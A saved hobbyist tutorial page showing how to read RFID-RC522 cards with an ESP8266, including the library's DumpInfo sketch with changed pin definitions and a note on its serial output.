+<p>Install the RFID522 library –&nbsp;<a href="https://github.com/miguelbalboa/rfid" target="_blank" rel="noopener">https://github.com/miguelbalboa/rfid</a></p>
+<p><img decoding="async" class="alignnone size-full wp-image-276" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/javaw_2017-12-22_00-08-09.png" alt="" width="784" height="411"></p>
+<p>This is the DumpInfo example modified – its the two pins defined at the top of the code</p>
+<p>[codesyntax lang=”cpp”]</p>
+<pre>#include &lt;SPI.h&gt;
+#include &lt;MFRC522.h&gt;
+
+#define RST_PIN         D3         // Configurable, see typical pin layout above
+#define SS_PIN          D8        // Configurable, see typical pin layout above
+
+MFRC522 mfrc522(SS_PIN, RST_PIN);  // Create MFRC522 instance
+
+void setup() {
+	Serial.begin(9600);		// Initialize serial communications with the PC
+	SPI.begin();			// Init SPI bus
+	mfrc522.PCD_Init();		// Init MFRC522
+	mfrc522.PCD_DumpVersionToSerial();	// Show details of PCD - MFRC522 Card Reader details
+	Serial.println(F("Scan PICC to see UID, SAK, type, and data blocks..."));
+}
+
+void loop() {
+	// Look for new cards
+	if ( ! mfrc522.PICC_IsNewCardPresent()) {
+		return;
+	}
+
+	// Select one of the cards
+	if ( ! mfrc522.PICC_ReadCardSerial()) {
+		return;
+	}
+
+	// Dump debug info about the card; PICC_HaltA() is automatically called
+	mfrc522.PICC_DumpToSerial(&amp;(mfrc522.uid));
+}</pre>
+<p>[/codesyntax]</p>
+<p>&nbsp;</p>
+<p><strong>Output</strong></p>
+<p>This is the output in the serial monitor</p>
+<figure id="attachment_277" aria-describedby="caption-attachment-277" style="width: 788px" class="wp-caption alignnone"><img decoding="async" class="size-full wp-image-277" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/javaw_2017-12-22_00-10-35.png" alt="serial monitor info mfrc522" width="788" height="507"><figcaption id="caption-attachment-277" class="wp-caption-text">serial monitor info mfrc522</figcaption></figure>
+<p>There are many other good examples in the library</p>
+<p>I did see errors in the serial monitor windows – wdg reset, I will investigate this</p>
+<p>&nbsp;</p>
+<p><strong>Links</strong></p>
+<p><a href="http://s.click.aliexpress.com/e/6IaaUvZ" target="_parent">1 set RFID module RC522 Kits S50 13.56 Mhz 6cm With Tags SPI Write &amp; Read for arduino uno 2560</a></p>
+<div class="addtoany_share_save_container addtoany_content addtoany_content_bottom"><div class="a2a_kit a2a_kit_size_32 addtoany_list" data-a2a-url="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php" data-a2a-title="ESP8266 and RFID-RC522 module example" style="line-height: 32px;"><a class="a2a_button_facebook" href="http://www.esp8266learning.com/#facebook" title="Facebook" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_facebook" style="background-color: rgb(8, 102, 255);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#fff" d="M28 16c0-6.627-5.373-12-12-12S4 9.373 4 16c0 5.628 3.875 10.35 9.101 11.647v-7.98h-2.474V16H13.1v-1.58c0-4.085 1.849-5.978 5.859-5.978.76 0 2.072.15 2.608.298v3.325c-.283-.03-.775-.045-1.386-.045-1.967 0-2.728.745-2.728 2.683V16h3.92l-.673 3.667h-3.247v8.245C23.395 27.195 28 22.135 28 16Z"></path></svg></span><span class="a2a_label">Facebook</span></a><a class="a2a_button_twitter" href="http://www.esp8266learning.com/#twitter" title="Twitter" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_twitter" style="background-color: rgb(29, 155, 240);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#FFF" d="M28 8.557a9.913 9.913 0 0 1-2.828.775 4.93 4.93 0 0 0 2.166-2.725 9.738 9.738 0 0 1-3.13 1.194 4.92 4.92 0 0 0-3.593-1.55 4.924 4.924 0 0 0-4.794 6.049c-4.09-.21-7.72-2.17-10.15-5.15a4.942 4.942 0 0 0-.665 2.477c0 1.71.87 3.214 2.19 4.1a4.968 4.968 0 0 1-2.23-.616v.06c0 2.39 1.7 4.38 3.952 4.83-.414.115-.85.174-1.297.174-.318 0-.626-.03-.928-.086a4.935 4.935 0 0 0 4.6 3.42 9.893 9.893 0 0 1-6.114 2.107c-.398 0-.79-.023-1.175-.068a13.953 13.953 0 0 0 7.55 2.213c9.056 0 14.01-7.507 14.01-14.013 0-.213-.005-.426-.015-.637.96-.695 1.795-1.56 2.455-2.55z"></path></svg></span><span class="a2a_label">Twitter</span></a><a class="a2a_button_email" href="http://www.esp8266learning.com/#email" title="Email" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_email" style="background-color: rgb(136, 137, 144);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#fff" d="M27 21.775v-9.9s-10.01 6.985-10.982 7.348C15.058 18.878 5 11.875 5 11.875v9.9c0 1.375.293 1.65 1.65 1.65h18.7c1.393 0 1.65-.242 1.65-1.65Zm-.017-11.841c0-1.002-.291-1.359-1.633-1.359H6.65c-1.38 0-1.65.429-1.65 1.43l.016.154s9.939 6.842 11 7.216C17.14 16.941 27 10.005 27 10.005l-.017-.072Z"></path></svg></span><span class="a2a_label">Email</span></a><a class="a2a_button_pinterest" href="http://www.esp8266learning.com/#pinterest" title="Pinterest" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_pinterest" style="background-color: rgb(230, 0, 35);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#fff" d="M15.995 4C9.361 4 4 9.37 4 15.995c0 5.084 3.16 9.428 7.622 11.176-.109-.948-.198-2.41.039-3.446.217-.938 1.402-5.963 1.402-5.963s-.356-.72-.356-1.777c0-1.668.968-2.912 2.172-2.912 1.027 0 1.52.77 1.52 1.688 0 1.027-.65 2.567-.996 3.998-.287 1.195.602 2.172 1.777 2.172 2.132 0 3.771-2.25 3.771-5.489 0-2.873-2.063-4.877-5.015-4.877-3.416 0-5.42 2.557-5.42 5.203 0 1.027.395 2.132.888 2.735a.357.357 0 0 1 .08.345c-.09.375-.297 1.195-.336 1.363-.05.217-.178.266-.405.158-1.481-.711-2.409-2.903-2.409-4.66 0-3.781 2.745-7.257 7.928-7.257 4.156 0 7.394 2.962 7.394 6.931 0 4.137-2.606 7.464-6.22 7.464-1.214 0-2.36-.632-2.744-1.383l-.75 2.854c-.267 1.046-.998 2.35-1.491 3.149a12.05 12.05 0 0 0 3.554.533C22.629 28 28 22.63 28 16.005 27.99 9.37 22.62 4 15.995 4Z"></path></svg></span><span class="a2a_label">Pinterest</span></a><a class="a2a_button_mastodon" href="http://www.esp8266learning.com/#mastodon" title="Mastodon" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_mastodon" style="background-color: rgb(99, 100, 255);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#fff" d="M26.5 12.187c0-4.887-3.198-6.319-3.198-6.319-1.575-.782-4.39-1.097-7.302-1.116-2.864 0-5.65.334-7.264 1.069-.029 0-3.236 1.431-3.236 6.366v3.819c.115 4.772.878 9.478 5.288 10.652 1.69.46 3.443.653 5.193.573a10.385 10.385 0 0 0 3.99-.907l-.086-1.861a12.76 12.76 0 0 1-3.885.515c-2.024-.067-4.171-.22-4.496-2.71a5.324 5.324 0 0 1-.048-.698c1.485.332 2.996.533 4.515.602a25.552 25.552 0 0 0 4.468-.267c2.863-.335 5.278-2.072 5.584-3.656a37.53 37.53 0 0 0 .477-6.062Zm-3.77 6.29h-2.35v-5.726c0-1.213-.506-1.824-1.527-1.824s-1.69.726-1.69 2.167v3.14h-2.329v-3.197c0-1.441-.563-2.167-1.69-2.167-1.125 0-1.526.611-1.526 1.823v5.728h-2.3v-5.9a4.282 4.282 0 0 1 .954-2.863 3.236 3.236 0 0 1 2.51-1.07 3.026 3.026 0 0 1 2.711 1.375l.582.955.583-.955a3.025 3.025 0 0 1 2.71-1.374 3.236 3.236 0 0 1 2.51 1.069c.656.807.995 1.825.955 2.864l-.105 5.956Z"></path></svg></span><span class="a2a_label">Mastodon</span></a><a class="a2a_button_pocket" href="http://www.esp8266learning.com/#pocket" title="Pocket" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_pocket" style="background-color: rgb(238, 64, 86);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#FFF" d="M16.005 6.244c2.927 0 5.854-.002 8.782 0 1.396.002 2.195.78 2.188 2.165-.015 2.483.116 4.985-.11 7.454-.75 8.204-10.027 12.607-16.91 8.064-3.086-2.037-4.82-4.926-4.917-8.673-.06-2.34-.034-4.684-.018-7.025.008-1.214.812-1.98 2.056-1.983 2.975-.01 5.952-.005 8.93-.007zm-5.037 5.483c-.867.093-1.365.396-1.62 1.025-.27.67-.078 1.256.417 1.732a529.74 529.74 0 0 0 5.09 4.838c.745.695 1.537.687 2.278-.01a473.74 473.74 0 0 0 4.93-4.686c.827-.797.91-1.714.252-2.38-.694-.704-1.583-.647-2.447.17-1.097 1.04-2.215 2.06-3.266 3.143-.485.492-.77.432-1.227-.027a87.392 87.392 0 0 0-3.39-3.225c-.325-.29-.77-.448-1.017-.584z"></path></svg></span><span class="a2a_label">Pocket</span></a><a class="a2a_button_sina_weibo" href="http://www.esp8266learning.com/#sina_weibo" title="Sina Weibo" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_sina_weibo" style="background-color: rgb(230, 22, 45);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><g fill="#FFF"><path d="M13.92 24.99c-4.303.424-8.02-1.52-8.3-4.346-.278-2.827 2.987-5.463 7.292-5.888 4.304-.426 8.018 1.52 8.297 4.345.274 2.83-2.987 5.468-7.29 5.89m8.61-9.38c-.367-.11-.62-.184-.428-.663.416-1.046.458-1.946.01-2.59-.846-1.204-3.155-1.14-5.8-.03 0-.004-.834.362-.62-.297.406-1.31.345-2.407-.29-3.04-1.435-1.437-5.255.055-8.53 3.33C4.422 14.77 3 17.37 3 19.617c0 4.3 5.513 6.913 10.907 6.913 7.07 0 11.776-4.105 11.776-7.37 0-1.97-1.66-3.09-3.15-3.55m4.693-7.87a6.89 6.89 0 0 0-6.55-2.12h-.002a.997.997 0 0 0-.765 1.182.99.99 0 0 0 1.18.765 4.91 4.91 0 0 1 4.66 1.508 4.899 4.899 0 0 1 1.02 4.787.995.995 0 1 0 1.894.615v-.004a6.883 6.883 0 0 0-1.44-6.732m-2.622 2.37a3.343 3.343 0 0 0-3.192-1.03.852.852 0 0 0-.655 1.016.854.854 0 0 0 1.016.657v.003a1.655 1.655 0 0 1 1.564.502c.406.453.514 1.066.338 1.606h.005a.858.858 0 1 0 1.63.528 3.345 3.345 0 0 0-.7-3.28"></path><path d="M14.16 19.87c-.15.26-.484.383-.746.275-.256-.104-.335-.393-.19-.646.15-.255.47-.378.725-.276.26.094.35.386.21.644m-1.375 1.76c-.417.666-1.308.957-1.98.65-.66-.302-.855-1.072-.44-1.72.413-.645 1.274-.933 1.94-.653.673.287.888 1.054.48 1.724m1.564-4.7c-2.047-.533-4.364.49-5.254 2.293-.904 1.84-.028 3.884 2.04 4.552 2.144.69 4.67-.368 5.55-2.354.865-1.943-.216-3.943-2.336-4.49"></path></g></svg></span><span class="a2a_label">Sina Weibo</span></a><a class="a2a_button_telegram" href="http://www.esp8266learning.com/#telegram" title="Telegram" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_telegram" style="background-color: rgb(44, 165, 224);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#FFF" d="M25.515 6.896 6.027 14.41c-1.33.534-1.322 1.276-.243 1.606l5 1.56 1.72 5.66c.226.625.115.873.77.873.506 0 .73-.235 1.012-.51l2.43-2.363 5.056 3.734c.93.514 1.602.25 1.834-.863l3.32-15.638c.338-1.363-.52-1.98-1.41-1.577z"></path></svg></span><span class="a2a_label">Telegram</span></a><a class="a2a_button_vk" href="http://www.esp8266learning.com/#vk" title="VK" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_vk" style="background-color: rgb(88, 126, 163);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#FFF" fill-rule="evenodd" d="M15.764 22.223h1.315s.394-.044.6-.262c.184-.2.18-.574.18-.574s-.03-1.764.79-2.023c.81-.255 1.844 1.705 2.942 2.46.832.57 1.464.445 1.464.445l2.936-.04s1.538-.097.81-1.304c-.06-.1-.426-.894-2.186-2.526-1.843-1.71-1.594-1.434.624-4.39 1.353-1.804 1.893-2.902 1.724-3.374-.16-.45-1.153-.33-1.153-.33l-3.306.02s-.247-.034-.428.074c-.178.108-.293.356-.293.356s-.522 1.394-1.223 2.58c-1.47 2.5-2.06 2.633-2.3 2.476-.563-.36-.42-1.454-.42-2.23 0-2.423.365-3.435-.72-3.696-.357-.085-.623-.143-1.544-.15-1.182-.014-2.18.003-2.743.28-.378.185-.667.595-.49.62.218.027.713.13.975.49.34.46.33 1.496.33 1.496s.193 2.852-.46 3.206c-.442.245-1.056-.252-2.37-2.52-.67-1.163-1.18-2.446-1.18-2.446s-.1-.24-.273-.37c-.212-.155-.506-.204-.506-.204l-3.145.02s-.473.015-.647.22c-.154.183-.01.56-.01.56s2.46 5.757 5.245 8.657c2.553 2.66 5.454 2.485 5.454 2.485z" clip-rule="evenodd"></path></svg></span><span class="a2a_label">VK</span></a><a class="a2a_button_wechat" href="http://www.esp8266learning.com/#wechat" title="WeChat" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_wechat" style="background-color: rgb(123, 179, 46);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><g fill="#FFF"><path d="M20.674 12.458c-2.228.116-4.165.792-5.738 2.318-1.59 1.542-2.315 3.43-2.116 5.772-.87-.108-1.664-.227-2.462-.294-.276-.023-.602.01-.836.14-.774.438-1.517.932-2.397 1.482.16-.73.266-1.37.45-1.985.137-.45.074-.7-.342-.994-2.673-1.89-3.803-4.714-2.958-7.624.78-2.69 2.697-4.323 5.302-5.173 3.555-1.16 7.55.022 9.712 2.845a6.632 6.632 0 0 1 1.38 3.516zm-10.253-.906c.025-.532-.44-1.01-.984-1.027a.997.997 0 0 0-1.038.964.984.984 0 0 0 .977 1.02 1.017 1.017 0 0 0 1.05-.96zm5.35-1.028c-.55.01-1.01.478-1 1.012.01.554.466.987 1.03.98a.982.982 0 0 0 .99-1.01.992.992 0 0 0-1.02-.982z"></path><path d="M25.68 26.347c-.705-.314-1.352-.785-2.042-.857-.686-.072-1.408.324-2.126.398-2.187.224-4.147-.386-5.762-1.88-3.073-2.842-2.634-7.2.92-9.53 3.16-2.07 7.795-1.38 10.022 1.493 1.944 2.51 1.716 5.837-.658 7.94-.687.61-.934 1.11-.493 1.917.086.148.095.336.14.523zm-8.03-7.775c.448 0 .818-.35.835-.795a.835.835 0 0 0-.83-.865.845.845 0 0 0-.84.86c.016.442.388.8.834.8zm5.176-1.658a.83.83 0 0 0-.824.794c-.02.47.347.858.813.86.45 0 .807-.34.823-.79a.825.825 0 0 0-.812-.864z"></path></g></svg></span><span class="a2a_label">WeChat</span></a><a class="a2a_button_reddit" href="http://www.esp8266learning.com/#reddit" title="Reddit" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_reddit" style="background-color: rgb(255, 69, 0);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#fff" d="M28.543 15.774a2.953 2.953 0 0 0-2.951-2.949 2.882 2.882 0 0 0-1.9.713 14.075 14.075 0 0 0-6.85-2.044l1.38-4.349 3.768.884a2.452 2.452 0 1 0 .24-1.176l-4.274-1a.6.6 0 0 0-.709.4l-1.659 5.224a14.314 14.314 0 0 0-7.316 2.029 2.908 2.908 0 0 0-1.872-.681 2.942 2.942 0 0 0-1.618 5.4 5.109 5.109 0 0 0-.062.765c0 4.158 5.037 7.541 11.229 7.541s11.22-3.383 11.22-7.541a5.2 5.2 0 0 0-.053-.706 2.963 2.963 0 0 0 1.427-2.51zm-18.008 1.88a1.753 1.753 0 0 1 1.73-1.74 1.73 1.73 0 0 1 1.709 1.74 1.709 1.709 0 0 1-1.709 1.711 1.733 1.733 0 0 1-1.73-1.711zm9.565 4.968a5.573 5.573 0 0 1-4.081 1.272h-.032a5.576 5.576 0 0 1-4.087-1.272.6.6 0 0 1 .844-.854 4.5 4.5 0 0 0 3.238.927h.032a4.5 4.5 0 0 0 3.237-.927.6.6 0 1 1 .844.854zm-.331-3.256a1.726 1.726 0 1 1 1.709-1.712 1.717 1.717 0 0 1-1.712 1.712z"></path></svg></span><span class="a2a_label">Reddit</span></a><a class="a2a_button_linkedin" href="http://www.esp8266learning.com/#linkedin" title="LinkedIn" rel="nofollow noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_linkedin" style="background-color: rgb(0, 123, 181);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#FFF" d="M6.227 12.61h4.19v13.48h-4.19V12.61zm2.095-6.7a2.43 2.43 0 0 1 0 4.86c-1.344 0-2.428-1.09-2.428-2.43s1.084-2.43 2.428-2.43m4.72 6.7h4.02v1.84h.058c.56-1.058 1.927-2.176 3.965-2.176 4.238 0 5.02 2.792 5.02 6.42v7.395h-4.183v-6.56c0-1.564-.03-3.574-2.178-3.574-2.18 0-2.514 1.7-2.514 3.46v6.668h-4.187V12.61z"></path></svg></span><span class="a2a_label">LinkedIn</span></a><a class="a2a_dd addtoany_share_save addtoany_share" href="https://www.addtoany.com/share#url=http%3A%2F%2Fwww.esp8266learning.com%2Fesp8266-rfid-rc522-module-example.php&amp;title=ESP8266%20and%20RFID-RC522%20module%20example"><span class="a2a_svg a2a_s__default a2a_s_a2a" style="background-color: rgb(1, 102, 255);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><g fill="#FFF"><path d="M14 7h4v18h-4z"></path><path d="M7 14h18v4H7z"></path></g></svg></span><span class="a2a_label a2a_localize" data-a2a-localize="inner,Share">Share</span></a></div></div><div class="td-a-rec td-a-rec-id-content_bottom  td_uid_3_6553840cbf408_rand td_block_template_1">
+<style>
+/* custom css */
+.td_uid_3_6553840cbf408_rand.td-a-rec-img {
+				    text-align: left;
+				}
+				.td_uid_3_6553840cbf408_rand.td-a-rec-img img {
+                    margin: 0 auto 0 0;
+                }
+</style><!-- Revive Adserver iFrame Tag - Generated with Revive Adserver v5.4.1 -->
+<iframe id="a3c8aa21" name="a3c8aa21" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/afr.html" frameborder="0" scrolling="no" width="728" height="90" allow="autoplay"><a href='https://onlymyads.website/ads/www/delivery/ck.php?n=ac8e0ead&amp;cb=INSERT_RANDOM_NUMBER_HERE' target='_blank'><img src='https://onlymyads.website/ads/www/delivery/avw.php?zoneid=3&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;n=ac8e0ead' border='0' alt='' /></a></iframe></div>        </div>
+
+
+        <footer>
+                        
+            <div class="td-post-source-tags">
+                                <ul class="td-tags td-post-small-box clearfix"><li><span>TAGS</span></li><li><a href="http://www.esp8266learning.com/tag/esp8266">ESP8266</a></li><li><a href="http://www.esp8266learning.com/tag/rfid-rc522">RFID-RC522</a></li></ul>            </div>
+
+            <div class="td-post-sharing-bottom"><div class="td-post-sharing-classic"><iframe frameborder="0" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/like.html" style="border:none; overflow:hidden; width:105px; height:21px; background-color:transparent;"></iframe></div><div id="td_social_sharing_article_bottom" class="td-post-sharing td-ps-bg td-ps-notext td-post-sharing-style1 "><div class="td-post-sharing-visible"><a class="td-social-sharing-button td-social-sharing-button-js td-social-network td-social-facebook" href="https://www.facebook.com/sharer.php?u=http%3A%2F%2Fwww.esp8266learning.com%2Fesp8266-rfid-rc522-module-example.php">
+                                        <div class="td-social-but-icon"><i class="td-icon-facebook"></i></div>
+                                        <div class="td-social-but-text">Facebook</div>
+                                    </a><a class="td-social-sharing-button td-social-sharing-button-js td-social-network td-social-twitter" href="https://twitter.com/intent/tweet?text=ESP8266+and+RFID-RC522+module+example&amp;url=http%3A%2F%2Fwww.esp8266learning.com%2Fesp8266-rfid-rc522-module-example.php&amp;via=esp8266+learning">
+                                        <div class="td-social-but-icon"><i class="td-icon-twitter"></i></div>
+                                        <div class="td-social-but-text">Twitter</div>
+                                    </a><a class="td-social-sharing-button td-social-sharing-button-js td-social-network td-social-pinterest" href="https://pinterest.com/pin/create/button/?url=http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php&amp;media=&amp;description=ESP8266+and+RFID-RC522+module+example">
+                                        <div class="td-social-but-icon"><i class="td-icon-pinterest"></i></div>
+                                        <div class="td-social-but-text">Pinterest</div>
+                                    </a><a class="td-social-sharing-button td-social-sharing-button-js td-social-network td-social-whatsapp" href="whatsapp://send?text=ESP8266+and+RFID-RC522+module+example%20%0A%0A%20http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php">
+                                        <div class="td-social-but-icon"><i class="td-icon-whatsapp"></i></div>
+                                        <div class="td-social-but-text">WhatsApp</div>
+                                    </a></div><div class="td-social-sharing-hidden"><ul class="td-pulldown-filter-list"></ul><a class="td-social-sharing-button td-social-handler td-social-expand-tabs" href="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#" data-block-uid="td_social_sharing_article_bottom">
+                                    <div class="td-social-but-icon"><i class="td-icon-plus td-social-expand-tabs-icon"></i></div>
+                                </a></div></div></div>            <div class="td-block-row td-post-next-prev"><div class="td-block-span6 td-post-prev-post"><div class="td-post-next-prev-content"><span>Previous article</span><a href="http://www.esp8266learning.com/esp8266-displaying-qr-code-oled-display.php">ESP8266 displaying a QR code on an OLED display</a></div></div><div class="td-next-prev-separator"></div><div class="td-block-span6 td-post-next-post"><div class="td-post-next-prev-content"><span>Next article</span><a href="http://www.esp8266learning.com/esp8266-sht21-humidity-temperature-sensor-example.php">ESP8266 and SHT21 humidity and temperature sensor example</a></div></div></div>            <div class="td-author-name vcard author" style="display: none"><span class="fn"><a href="http://www.esp8266learning.com/author/shedboy71">shedboy71</a></span></div>	        <span class="td-page-meta" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><meta itemprop="name" content="shedboy71"></span><meta itemprop="datePublished" content="2017-12-22T12:57:47+00:00"><meta itemprop="dateModified" content="2017-12-22T12:57:47+00:00"><meta itemscope="" itemprop="mainEntityOfPage" itemtype="https://schema.org/WebPage" itemid="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php"><span class="td-page-meta" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"><span class="td-page-meta" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="http://esp8266learning.b-cdn.net/wp-content/uploads/2019/06/esp8266_272.png"></span><meta itemprop="name" content="esp8266 learning"></span><meta itemprop="headline " content="ESP8266 and RFID-RC522 module example"><span class="td-page-meta" itemprop="image" itemscope="" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="http://esp8266learning.b-cdn.net/wp-content/themes/Newspaper/images/no-thumb/td_meta_replacement.png"><meta itemprop="width" content="1068"><meta itemprop="height" content="580"></span>        </footer>
+
+    </article> <!-- /.post -->
+
+    <div class="td_block_wrap td_block_related_posts td_uid_4_6553840cc0136_rand td_with_ajax_pagination td-pb-border-top td_block_template_1" data-td-block-uid="td_uid_4_6553840cc0136"><script>var block_td_uid_4_6553840cc0136 = new tdBlock();
+block_td_uid_4_6553840cc0136.id = "td_uid_4_6553840cc0136";
+block_td_uid_4_6553840cc0136.atts = '{"limit":3,"ajax_pagination":"next_prev","live_filter":"cur_post_same_categories","td_ajax_filter_type":"td_custom_related","class":"td_uid_4_6553840cc0136_rand","td_column_number":3,"live_filter_cur_post_id":488,"live_filter_cur_post_author":"1","block_template_id":"","header_color":"","ajax_pagination_infinite_stop":"","offset":"","td_ajax_preloading":"","td_filter_default_txt":"","td_ajax_filter_ids":"","el_class":"","color_preset":"","border_top":"","css":"","tdc_css":"","tdc_css_class":"td_uid_4_6553840cc0136_rand","tdc_css_class_style":"td_uid_4_6553840cc0136_rand_style"}';
+block_td_uid_4_6553840cc0136.td_column_number = "3";
+block_td_uid_4_6553840cc0136.block_type = "td_block_related_posts";
+block_td_uid_4_6553840cc0136.post_count = "3";
+block_td_uid_4_6553840cc0136.found_posts = "167";
+block_td_uid_4_6553840cc0136.header_color = "";
+block_td_uid_4_6553840cc0136.ajax_pagination_infinite_stop = "";
+block_td_uid_4_6553840cc0136.max_num_pages = "56";
+tdBlocksArray.push(block_td_uid_4_6553840cc0136);
+</script><h4 class="td-related-title td-block-title"><a id="td_uid_5_6553840cc11a4" class="td-related-left td-cur-simple-item" data-td_filter_value="" data-td_block_id="td_uid_4_6553840cc0136" href="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#">RELATED ARTICLES</a><a id="td_uid_6_6553840cc11ab" class="td-related-right" data-td_filter_value="td_related_more_from_author" data-td_block_id="td_uid_4_6553840cc0136" href="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#">MORE FROM AUTHOR</a></h4><div id="td_uid_4_6553840cc0136" class="td_block_inner">
+
+	<div class="td-related-row">
+
+	<div class="td-related-span4">
+
+        <div class="td_module_related_posts td-animation-stack td_mod_related_posts">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.esp8266learning.com/using-a-stts22h-temperature-sensor-with-an-esp8266.php" rel="bookmark" class="td-image-wrap" title="Using a STTS22H temperature sensor with an ESP8266"><img width="218" height="150" class="entry-thumb" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/esp8266-and-STTS22H_bb-218x150.png" srcset="http://esp8266learning.b-cdn.net/wp-content/uploads/2023/07/esp8266-and-STTS22H_bb-218x150.png 218w, http://esp8266learning.b-cdn.net/wp-content/uploads/2023/07/esp8266-and-STTS22H_bb-100x70.png 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Using a STTS22H temperature sensor with an ESP8266"></a></div>                            </div>
+            <div class="item-details">
+                <h3 class="entry-title td-module-title"><a href="http://www.esp8266learning.com/using-a-stts22h-temperature-sensor-with-an-esp8266.php" rel="bookmark" title="Using a STTS22H temperature sensor with an ESP8266">Using a STTS22H temperature sensor with an ESP8266</a></h3>            </div>
+        </div>
+        
+	</div> <!-- ./td-related-span4 -->
+
+	<div class="td-related-span4">
+
+        <div class="td_module_related_posts td-animation-stack td_mod_related_posts">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.esp8266learning.com/using-a-bmp384-pressure-sensor-with-an-esp8266.php" rel="bookmark" class="td-image-wrap" title="Using a BMP384 pressure sensor  with an ESP8266"><img width="218" height="150" class="entry-thumb" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/esp8266-and-bmp384_bb-218x150.png" srcset="http://esp8266learning.b-cdn.net/wp-content/uploads/2023/07/esp8266-and-bmp384_bb-218x150.png 218w, http://esp8266learning.b-cdn.net/wp-content/uploads/2023/07/esp8266-and-bmp384_bb-100x70.png 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Using a BMP384 pressure sensor  with an ESP8266"></a></div>                            </div>
+            <div class="item-details">
+                <h3 class="entry-title td-module-title"><a href="http://www.esp8266learning.com/using-a-bmp384-pressure-sensor-with-an-esp8266.php" rel="bookmark" title="Using a BMP384 pressure sensor  with an ESP8266">Using a BMP384 pressure sensor  with an ESP8266</a></h3>            </div>
+        </div>
+        
+	</div> <!-- ./td-related-span4 -->
+
+	<div class="td-related-span4">
+
+        <div class="td_module_related_posts td-animation-stack td_mod_related_posts">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.esp8266learning.com/using-a-kx132-or-kx134-triple-axis-accelerometer-with-an-esp8266.php" rel="bookmark" class="td-image-wrap" title="Using a KX132 or KX134 Triple Axis Accelerometer with an ESP8266"><img width="218" height="150" class="entry-thumb" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/esp8266-and-KX13x_bb-218x150.png" srcset="http://esp8266learning.b-cdn.net/wp-content/uploads/2023/07/esp8266-and-KX13x_bb-218x150.png 218w, http://esp8266learning.b-cdn.net/wp-content/uploads/2023/07/esp8266-and-KX13x_bb-100x70.png 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Using a KX132 or KX134 Triple Axis Accelerometer with an ESP8266"></a></div>                            </div>
+            <div class="item-details">
+                <h3 class="entry-title td-module-title"><a href="http://www.esp8266learning.com/using-a-kx132-or-kx134-triple-axis-accelerometer-with-an-esp8266.php" rel="bookmark" title="Using a KX132 or KX134 Triple Axis Accelerometer with an ESP8266">Using a KX132 or KX134 Triple Axis Accelerometer with an ESP8266</a></h3>            </div>
+        </div>
+        
